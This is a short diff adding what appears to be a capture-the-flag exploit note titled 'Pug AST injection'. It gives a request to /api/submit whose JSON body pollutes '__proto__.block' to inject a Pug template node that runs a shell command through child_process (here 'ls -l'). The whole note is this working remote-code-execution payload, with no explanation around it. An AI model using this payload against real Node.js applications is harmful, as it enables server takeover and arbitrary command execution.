@@ -1,0 +1,11 @@
+1. Pug AST injection
+
+
+post to /api/submit
+{
+       "song.name": "The Goose went wild", 
+        "__proto__.block":{
+            "type":"Text",
+			"line":"process.mainModule.require('child_process').exec('ls -l')"
+		}
+}
